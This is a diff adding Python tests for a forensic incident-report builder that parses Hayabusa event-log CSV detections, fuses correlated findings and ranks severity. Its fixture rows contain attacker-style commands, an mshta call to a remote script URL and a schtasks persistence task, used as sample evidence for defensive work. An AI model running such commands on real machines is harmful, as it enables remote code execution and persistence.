@@ -434,3 +434,154 @@ def test_dated_timeline_drops_generic_jsonl():
     assert len(untimed) == 1
     assert "wevtutil" in untimed[0]["description"]
 
+
+
+def _legacy_hit_finding(fid: str, needle: str, rows: list[dict]) -> dict:
+    """Findings staged before parsed-evidence rows: raw CSV text as detail."""
+    return {
+        "id": fid,
+        "status": "APPROVED",
+        "title": f"Signal: {needle} — {len(rows)} hit(s) across hayabusa",
+        "severity": "",
+        "observation": f"{len(rows)} hit(s) across hayabusa matching examiner-selected needles.",
+        "interpretation": (
+            f"Needle '{needle}' (sigma) matched {len(rows)} row(s) — "
+            "candidate signal pending examiner review."
+        ),
+        "approved_by": "e2e",
+        "evidence": [
+            {
+                "time": r.get("time", ""),
+                "source": f"hayabusa/{r['artifact']}",
+                "artifact": r["artifact"],
+                "detail": r["detail"],
+            }
+            for r in rows
+        ],
+    }
+
+
+_HAY_HEADER = (
+    "Timestamp,RuleTitle,Level,Computer,Channel,EventID,RecordID,Details,"
+    "ExtraFieldInfo,RuleID"
+)
+_HAY_ROW_A = (
+    '"2019-05-21 21:02:57.867 +05:30","Proc Exec","high","IEWIN7","Sysmon",'
+    '1,4127,"Cmdline: ""C:\Windows\System32\mshta.exe"" '
+    'https://x.tld/a.txt",,r1'
+)
+_HAY_ROW_B = (
+    '"2019-05-21 21:02:59.769 +05:30","Scheduled Task Creation Via '
+    'Schtasks.EXE","med","IEWIN7","Sysmon",1,4129,"Cmdline: schtasks.exe '
+    '/Create /TN MSOFFICE_",,r2'
+)
+
+
+def _case_with_csv(tmp_path):
+    case = tmp_path / "CASE-LEGACY"
+    ext = case / "extractions" / "hayabusa"
+    ext.mkdir(parents=True)
+    (ext / "evtx-timeline.csv").write_text(
+        _HAY_HEADER + "\n" + _HAY_ROW_A + "\n" + _HAY_ROW_B + "\n",
+        encoding="utf-8",
+    )
+    return case
+
+
+def test_report_rehydrates_legacy_raw_csv_rows(tmp_path):
+    """Pre-parse findings: raw CSV detail -> parsed fields + recovered loc."""
+    case = _case_with_csv(tmp_path)
+    f = _legacy_hit_finding("F-1", "mshta", [
+        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A,
+         "time": "2019-05-21T21:02:57"},
+    ])
+    md = build_dfir_markdown(
+        case_id="CASE-LEGACY", case_name="t", findings=[f], evidence=[],
+        case_dir=case,
+    )
+    assert "RuleTitle: Proc Exec" in md
+    assert "pending examiner review" not in md
+    assert "evtx-timeline.csv:2" in md  # true file:line recovered
+    assert "[high]" in md  # severity backfilled from Level=high
+
+
+def test_report_fuses_findings_sharing_evidence_rows(tmp_path):
+    """Needles on the same rows collapse into one correlated section."""
+    case = _case_with_csv(tmp_path)
+    rows = [
+        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A,
+         "time": "2019-05-21T21:02:57"},
+        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_B,
+         "time": "2019-05-21T21:02:59"},
+    ]
+    fa = _legacy_hit_finding("F-A", "mshta", rows)
+    fb = _legacy_hit_finding("F-B", "mshta.exe", rows)
+    md = build_dfir_markdown(
+        case_id="CASE-LEGACY", case_name="t", findings=[fa, fb], evidence=[],
+        case_dir=case,
+    )
+    assert "Correlated signal" in md
+    assert "one attack chain" in md
+    assert md.count("### Signal:") == 0  # no standalone sections
+
+
+def test_report_keeps_distinct_findings_separate(tmp_path):
+    """Below-overlap findings must not fuse — each stays its own section."""
+    case = _case_with_csv(tmp_path)
+    fa = _legacy_hit_finding("F-A", "mshta", [
+        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A,
+         "time": "2019-05-21T21:02:57"},
+    ])
+    fb = _legacy_hit_finding("F-B", "schtasks", [
+        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_B,
+         "time": "2019-05-21T21:02:59"},
+    ])
+    md = build_dfir_markdown(
+        case_id="CASE-LEGACY", case_name="t", findings=[fa, fb], evidence=[],
+        case_dir=case,
+    )
+    assert "Correlated signal" not in md
+    assert md.count("### Signal:") == 2
+
+
+def test_report_without_case_dir_keeps_working(tmp_path):
+    """case_dir=None callers keep old rendering — no crash, no rehydrate."""
+    f = _legacy_hit_finding("F-1", "mshta", [
+        {"artifact": "hayabusa/evtx-timeline.csv", "detail": _HAY_ROW_A},
+    ])
+    md = build_dfir_markdown(
+        case_id="CASE-LEGACY", case_name="t", findings=[f], evidence=[],
+    )
+    assert "### Signal: mshta" in md
+
+
+def test_severity_from_hit_levels():
+    from nexus.langgraph.mode1 import _severity_from_hits
+
+    assert _severity_from_hits([
+        {"family": "hayabusa", "fields": {"Level": "high"}},
+        {"family": "evtxecmd", "fields": {"Level": "Info"}},
+    ]) == "high"
+    assert _severity_from_hits([
+        {"family": "chainsaw", "fields": {"detections": "Rule X"}},
+    ]) == "medium"
+    # evtxecmd Level is the Windows event level, not detection severity
+    assert _severity_from_hits([
+        {"family": "evtxecmd", "fields": {"Level": "Info"}},
+    ]) == "low"
+    assert _severity_from_hits([]) == "low"
+
+
+def test_report_sorts_key_takeaways_by_severity():
+    md = build_dfir_markdown(
+        case_id="CASE-SEV", case_name="t",
+        findings=[
+            {"id": "F-low", "title": "aaa low", "status": "APPROVED",
+             "severity": "low", "observation": "x"},
+            {"id": "F-crit", "title": "zzz critical", "status": "APPROVED",
+             "severity": "critical", "observation": "x"},
+        ],
+        evidence=[],
+    )
+    kt = md.split("## Key Takeaways")[1].split("##")[0]
+    assert kt.index("[critical]") < kt.index("[low]")
